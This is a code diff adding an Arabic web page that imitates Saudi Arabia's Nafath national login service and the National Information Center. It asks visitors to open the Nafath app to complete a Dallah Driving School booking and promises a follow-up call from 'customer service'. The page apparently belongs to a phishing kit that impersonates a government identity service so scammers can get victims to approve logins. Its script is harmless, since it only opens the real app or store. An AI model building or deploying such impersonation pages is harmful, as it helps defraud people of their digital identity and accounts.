@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>الانتقال إلى نفاذ</title>
+  <style>
+    body {
+      font-family: "Tahoma", sans-serif;
+      margin: 0;
+      padding: 0;
+      background: #fff;
+      color: #333;
+      text-align: center;
+    }
+
+    /* الهيدر */
+    header {
+      background: #fff;
+      padding: 10px 20px;
+      border-bottom: 1px solid #ddd;
+      display: flex;
+      justify-content: flex-start;
+      align-items: center;
+      height: 75px;
+    }
+    header img {
+      height: 100%;
+      border-radius: 12px;
+    }
+
+    /* الكونتينر */
+    .container {
+      padding: 30px 20px;
+    }
+    .nafath-logo {
+      max-width: 150px;
+      margin: 20px auto;
+    }
+    .nafath-logo img {
+      width: 100%;
+      border-radius: 10px;
+    }
+
+    .message {
+      font-size: 18px;
+      line-height: 1.8;
+      color: #00796B;
+      margin: 20px 0 30px;
+    }
+
+    .btn {
+      display: inline-block;
+      background: #009688;
+      color: #fff;
+      padding: 12px 25px;
+      border-radius: 8px;
+      text-decoration: none;
+      font-size: 18px;
+      font-weight: bold;
+      transition: 0.3s;
+      margin-bottom: 20px;
+    }
+    .btn:hover {
+      background: #00796B;
+    }
+
+    /* أزرار المتاجر */
+    .store-buttons {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      margin-top: 10px;
+    }
+    .store-buttons img {
+      height: 50px;
+      transition: transform 0.2s;
+    }
+    .store-buttons img:hover {
+      transform: scale(1.05);
+    }
+
+    /* الفوتر */
+    footer {
+      background: #f1f2f6;
+      text-align: center;
+      padding: 20px;
+      border-top: 1px solid #ddd;
+      font-size: 14px;
+      color: #333;
+    }
+    footer img {
+      height: 60px;
+      margin-bottom: 10px;
+      border-radius: 15px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- الهيدر -->
+  <header>
+    <img src="images/CST.png" alt="شعار CST">
+  </header>
+
+  <!-- المحتوى -->
+  <div class="container">
+    <div class="nafath-logo">
+      <img src="images/nafad1.jpg" alt="شعار نفاذ">
+    </div>
+
+    <p class="message">
+      الرجاء الإنتقال إلى تطبيق النفاذ الوطني الموحد المثبت على جوالك لإكمال عملية حجز الموعد لدى شركة دلة لتعليم القيادة
+    </p>
+    <p class="message">
+      سيتم التواصل معك خلال لحظات من خلال خدمة العملاء عبر الجوال المعتمد لإكمال عملية حجز الموعد لدى شركة دلة لتعليم القيادة
+    </p>
+
+    <!-- زر المتابعة -->
+    <a href="#" class="btn" id="continueBtn">متابعة</a>
+  </div>
+
+  <footer>
+    <img src="images/nic.png" alt="شعار مركز المعلومات الوطني">
+    <p>© 2025 النفاذ الوطني الموحد جميع الحقوق محفوظة</p>
+    <p>تطوير وتشغيل مركز المعلومات الوطني</p>
+    <img src="images/digital.png" alt="شعار مركز المعلومات الوطني">
+  </footer>
+
+  <!-- سكربت في آخر الصفحة -->
+  <script>
+    document.getElementById("continueBtn").addEventListener("click", function (e) {
+      e.preventDefault();
+
+      var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+      if (/iPhone|iPad|iPod/i.test(userAgent)) {
+        // محاولة فتح التطبيق
+        window.location.href = "nafath://";
+        // إذا لم يكن موجود، بعد 1.5 ثانية يحول إلى متجر Apple
+        setTimeout(function () {
+          window.location.href = "https://apps.apple.com/sa/app/%D9%86%D9%81%D8%A7%D8%B0-nafath/id1598909871";
+        }, 1500);
+      } else if (/android/i.test(userAgent)) {
+        // محاولة فتح التطبيق
+        window.location.href = "intent://#Intent;scheme=nafath;package=sa.gov.nic.myid;end;";
+        // fallback لمتجر Google Play
+        setTimeout(function () {
+          window.location.href = "https://play.google.com/store/apps/details?id=sa.gov.nic.myid";
+        }, 1500);
+      } else {
+        alert("الرجاء فتح الصفحة من جوالك لاستخدام تطبيق نفاذ.");
+      }
+    });
+  </script>
+
+</body>
+</html>
